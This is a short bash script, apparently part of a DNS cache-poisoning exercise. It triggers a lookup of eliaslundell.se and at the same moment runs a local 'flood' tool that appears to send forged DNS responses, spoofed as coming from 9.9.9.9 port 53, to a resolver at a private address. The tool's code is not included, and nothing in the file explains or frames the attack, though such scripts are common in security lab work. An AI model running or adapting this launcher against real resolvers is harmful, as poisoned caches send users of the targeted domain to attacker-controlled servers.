#!/bin/bash

dig @dns_server eliaslundell.se &
/root/flood 9.9.9.9 53 172.18.0.2 33333 eliaslundell.se 0 0
